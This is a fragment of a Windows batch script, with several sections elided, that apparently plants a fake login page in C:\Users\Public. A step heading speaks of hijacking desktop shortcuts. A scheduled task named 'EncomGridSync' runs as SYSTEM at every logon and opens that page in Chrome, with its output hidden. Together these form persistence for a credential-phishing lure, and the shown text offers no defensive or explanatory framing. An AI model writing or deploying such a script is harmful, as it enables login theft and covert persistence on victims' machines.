...
set WEB_PATH=C:\Users\Public\login.html
set B64_TEMP=C:\Users\Public\b64.txt
...
:: ----------------------------------------------------
:: STEP 3: Hijack Desktop Shortcuts via Simple PowerShell Paths
:: ----------------------------------------------------
...
schtasks /create /tn "EncomGridSync" /tr "cmd.exe /c start chrome.exe --new-window \"C:\Users\Public\login.html\"" /sc onlogon /ru "SYSTEM" /f >nul 2>&1

if %errorlevel% equ 0 (
    echo     - Scheduled task 'EncomGridSync' registered successfully.
) else (
    echo     [!] Warning: Access denied creating scheduled task.
)
